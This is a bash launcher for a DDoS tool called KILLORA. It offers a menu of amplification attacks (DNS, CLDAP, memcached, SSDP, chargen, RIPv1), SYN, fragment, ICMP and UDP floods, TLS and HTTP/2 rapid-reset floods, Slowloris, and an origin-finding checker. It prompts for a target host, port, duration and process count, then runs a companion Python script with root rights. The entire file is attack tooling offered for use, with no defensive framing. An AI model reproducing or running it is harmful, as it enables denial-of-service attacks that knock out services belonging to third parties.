#!/usr/bin/env bash
# KILLORA by BrokenCodeZ
set -u
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$DIR/killora.py"
C1='\033[1;36m'; C2='\033[1;35m'; C3='\033[1;33m'
C4='\033[1;32m'; CR='\033[1;31m'; DM='\033[2m'; N='\033[0m'

banner() {
  clear
  printf "${C2}"
  cat <<'EOF'
   __ __ _ _ _      ___  ___  ___  _   _
  |  |  | | | | ___| . |  _| . | | | |
  |    <| | | ||___| | | | | | | |_| |
  |_|\__|_____|    |___|_| |___|_____|
EOF
  printf "${N}"
  printf "        ${C1}K I L L O R A${N}  ${DM}by BrokenCodeZ${N}\n"
  printf "  ${DM}6x AMP . FRAG . SYN . TLS . H2-RESET . POST${N}\n"
  printf "  ${DM}------------------------------------------------${N}\n\n"
}

need() { command -v "$1" >/dev/null 2>&1; }

boot() {
  if [ -n "${TERMUX_VERSION:-}" ]; then
    need python3 || pkg install -y python >/dev/null 2>&1
  else
    need python3 || { apt-get update -qq >/dev/null 2>&1 && \
                      apt-get install -y python3 >/dev/null 2>&1; }
  fi
  need python3 || { printf "${CR}  python3 missing. Install karo.${N}\n"; exit 1; }
  [ -f "$PY" ] || { printf "${CR}  killora.py nahi mila $DIR me.${N}\n"; exit 1; }

  for mod in h2 dns.resolver; do
    python3 -c "import $mod" 2>/dev/null && continue
    case "$mod" in
      h2) pkgname=h2 ;;
      *)  pkgname=dnspython ;;
    esac
    printf "  ${DM}%s install...${N}\n" "$pkgname"
    python3 -m pip install --quiet --break-system-packages "$pkgname" 2>/dev/null || \
      python3 -m pip install --quiet "$pkgname" 2>/dev/null || \
      pip3 install --quiet "$pkgname" 2>/dev/null
    python3 -c "import $mod" 2>/dev/null || \
      printf "  ${CR}%s fail - %s mode chalega nahi${N}\n" "$pkgname" "$mod"
  done

  ulimit -n 1048576 2>/dev/null || ulimit -n 65535 2>/dev/null || true
}

ask_num() {
  local prompt="$1" def="$2" min="$3" max="$4" val
  while :; do
    read -rp "$prompt" val
    val="${val:-$def}"
    if [[ "$val" =~ ^[0-9]+$ ]] && [ "$val" -ge "$min" ] && [ "$val" -le "$max" ]; then
      printf '%s' "$val"
      return
    fi
    printf "  ${CR}%s-%s ke beech number daalo${N}\n" "$min" "$max" >&2
  done
}

menu() {
  printf "  ${CR}[ ENTER ]${N} MAX  ${DM}sab vectors ek saath${N}\n\n"
  printf "  ${C3}[1]${N}  MAX        ${C3}[2]${N}  DNS AMP   ${C3}[3]${N}  CLDAP AMP\n"
  printf "  ${C3}[4]${N}  MEMCACHED  ${C3}[5]${N}  SSDP AMP  ${C3}[6]${N}  CHARGEN\n"
  printf "  ${C3}[7]${N}  RIPv1      ${C3}[8]${N}  SYN+opts  ${C3}[9]${N}  FRAG\n"
  printf "  ${C3}[10]${N} TLS Hello  ${C3}[11]${N} H2 RESET  ${C3}[12]${N} H2 POST\n"
  printf "  ${C3}[13]${N} HTTP       ${C3}[14]${N} KEEP-ALIVE ${C3}[15]${N} UDP\n"
  printf "  ${C3}[16]${N} ICMP       ${C3}[17]${N} Slowloris\n"
  printf "  ${C4}[18]${N} Probe ${DM}(codes dekho)${N}   ${C4}[19]${N} Checker ${DM}(origin hunt)${N}\n"
  printf "  ${CR}[0]${N}  Exit\n\n"
}

banner
boot

MODE=""
while [ -z "$MODE" ]; do
  banner
  menu
  read -rp "  ${C1}Killora >${N} " OPT || exit 0
  case "$OPT" in
    ""|1) MODE=max;;
    2) MODE=dnsamp;;   3) MODE=cldapamp;; 4) MODE=memcacheamp;;
    5) MODE=ssdpamp;;  6) MODE=chargenamp;; 7) MODE=ripamp;;
    8) MODE=syn;;      9) MODE=frag;;     10) MODE=tlshello;;
    11) MODE=h2reset;; 12) MODE=h2;;      13) MODE=http;;
    14) MODE=keep;;    15) MODE=udp;;     16) MODE=icmp;;
    17) MODE=slow;;    18) MODE=probe;;   19) MODE=check;;
    0) printf "\n  ${C1}bye${N}\n"; exit 0;;
    *) printf "\n  ${CR}galat option${N}"; sleep 1;;
  esac
done

banner
while :; do
  read -rp "  Target (IP / host / URL): " RAW
  [ -n "$RAW" ] && break
  printf "  ${CR}khali nahi chhod sakte${N}\n"
done
RAW="${RAW#http://}"; RAW="${RAW#https://}"; RAW="${RAW%%/*}"
HOST="$RAW"

SUDO=""
if [ "$EUID" -ne 0 ] && need sudo; then SUDO="sudo -E"; fi

if [ "$MODE" = "check" ]; then
  exec ${SUDO:+$SUDO }python3 "$PY" check "$HOST" 0 0 5 1
fi

CPU=$(nproc 2>/dev/null || echo 2)
[ "$CPU" -gt 8 ] && CPU=8

case "$MODE" in
  max) PORT=443; COUNT=0; DUR="${KILLORA_DUR:-120}"; PROCS="$CPU";;
  probe) PORT=443; COUNT=0; DUR=25; PROCS=2;;
  dnsamp) DEF=53;;
  cldapamp) DEF=389;;
  memcacheamp) DEF=11211;;
  ssdpamp) DEF=1900;;
  chargenamp) DEF=19;;
  ripamp) DEF=520;;
  tlshello|h2reset|h2) DEF=443;;
  *) DEF=80;;
esac

if [ -z "${PORT:-}" ]; then
  printf "\n  ${DM}port: web=80/443, game=25565, DNS=53${N}\n"
  PORT=$(ask_num "  Port [$DEF]: " "$DEF" 1 65535)
  COUNT=$(ask_num "  Count (0=unlimited): " 0 0 1000000000)
  DUR=$(ask_num "  Duration sec [60]: " 60 5 86400)
  PROCS=$(ask_num "  Procs [$CPU]: " "$CPU" 1 64)
fi

printf "\n  ${DM}-------------------------------${N}\n"
printf "  Target  : ${C4}%s${N}\n" "$HOST"
printf "  Port    : ${C4}%s${N}\n" "$PORT"
printf "  Mode    : ${CR}%s${N}\n" "$MODE"
printf "  Amount  : ${C4}%s${N}   Duration: ${C4}%ss${N}   Procs: ${C4}%s${N}\n" \
  "$COUNT" "$DUR" "$PROCS"
printf "  ${DM}-------------------------------${N}\n"

case "$MODE" in
  max|syn|frag|icmp|*amp)
    if [ "$EUID" -ne 0 ]; then
      if [ -n "$SUDO" ]; then
        printf "  ${C3}root mode - sudo se chalega${N}\n"
      else
        printf "  ${CR}root mode - sudo/tsu nahi mila, fail ho sakta hai${N}\n"
      fi
    fi;;
esac

printf "\n  ${C3}ENTER = launch   (Ctrl+C = rok)${N}"
read -r _

if [ -n "$SUDO" ]; then
  exec $SUDO python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"
fi
exec python3 "$PY" "$MODE" "$HOST" "$PORT" "$COUNT" "$DUR" "$PROCS"